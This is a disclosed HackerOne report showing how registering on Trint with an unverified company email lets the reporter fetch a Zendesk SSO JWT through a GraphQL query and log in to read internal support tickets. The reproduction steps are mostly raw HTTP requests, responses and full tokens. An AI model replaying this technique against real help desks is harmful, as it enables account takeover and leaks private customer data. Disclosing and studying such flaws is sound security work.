# SSO bypass in zendesk using trint organization able to leak internal ticket information

## Report Details
- **Report ID**: 734936
- **URL**: https://hackerone.com/reports/734936
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-11-11T12:36:00.343Z
- **Disclosed**: 2020-08-24T15:43:29.461Z

## Reporter
- **Username**: sopankbegitu
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: trint

## Vulnerability Information
#Summary
hello there because in `app.trint.com` there's no email verification i able to login in your `zendesk SSO` using your organization
your organization using domain `*@trint.com` because there's no email verification i able to read and takeover + claim this email
`support+1@trint.com` and i able to login in zendesk SSO using that email.

#How to reproduce
* i registered in `app.trint.com` using this email `support+1@trint.com` until registration step finish
* i check my burp history there's a `graphql` request in this host `https://graphql2.trint.com/`
* i use this query

```
POST / HTTP/1.1
Host: graphql2.trint.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://app.trint.com/
content-type: application/json
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJodHRwczovL2FwcC50cmludC5jb20vdXNlcklkIjoiNWRjOTUwZWEzOGFhMjI3MmExNzAyMzFkIiwiaHR0cHM6Ly9hcHAudHJpbnQuY29tL2lzTmV3VXNlciI6dHJ1ZSwiaHR0cHM6Ly9zY2hlbWEudHJpbnQuY29tL2F1dGhqdGkiOiI0ZmMwMjUyZS03NTFiLTQwNjctOWU0MC00OGQ4MWMzMjRiMjIiLCJpc3MiOiJodHRwczovL3RyaW50LmF1dGgwLmNvbS8iLCJzdWIiOiJhdXRoMHw1ZGM5NTBlYTM4YWEyMjcyYTE3MDIzMWQiLCJhdWQiOiJ0cmludC1hcGlzIiwiaWF0IjoxNTczNDc0NTQyLCJleHAiOjE1NzYwNjY1NDIsImF6cCI6ImljaDRoeVZZUEtLZ2VFb1RoNmZXUFhjNmZydmVUY1RxIiwiZ3R5IjoicGFzc3dvcmQifQ.JyIc6PZyjidptrvaFT6MykOr0BopUi1F7fZWTvbeKeU
X-Trint-Request-Id: 4b2f23d5-98a3-4571-a9e1-4218cca76e1b
X-Trint-Super-Properties: {}
Origin: https://app.trint.com
Content-Length: 111
Connection: close

{"operationName":null,"variables":{"status":"PENDING"},"query":"query zendeskToken {\n    zendeskToken\n  }\n"}
```

>response header
```
HTTP/1.1 200 OK
Date: Mon, 11 Nov 2019 12:17:06 GMT
Content-Type: application/json
Content-Length: 272
Connection: close
X-Powered-By: Express
Access-Control-Allow-Origin: *
Vary: Accept-Encoding

{"data":{"zendeskToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1NzM0NzQ2MjYsImp0aSI6IjcwOWM2Njg3LWI3OWUtNDI2ZC04MjJhLWVkYTUyYzM3ZDAyYyIsIm5hbWUiOiJzZGFkc2FzZGEgYXNkc2FkYXMiLCJlbWFpbCI6InN1cHBvcnQrMUB0cmludC5jb20ifQ.G8VnRzcF5vkDl4X36_-olJNjtdawMn5G0KaL0FHPdQM"}}
```

* i crafted this url `https://trintsupport.zendesk.com/access/jwt?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1NzM0NzQ2MjYsImp0aSI6IjcwOWM2Njg3LWI3OWUtNDI2ZC04MjJhLWVkYTUyYzM3ZDAyYyIsIm5hbWUiOiJzZGFkc2FzZGEgYXNkc2FkYXMiLCJlbWFpbCI6InN1cHBvcnQrMUB0cmludC5jb20ifQ.G8VnRzcF5vkDl4X36_-olJNjtdawMn5G0KaL0FHPdQM`

* boom logged in in ticket using email `support+1@trint.com`

#POC

{F631462}

## Impact

#Impact
* i can read your ticket organization request through `https://support.trint.com/hc/en-us/requests/organization`

## Attachments
- Screen_Shot_2019-11-11_at_19.32.53.png
- sso_bypass_trint.mov
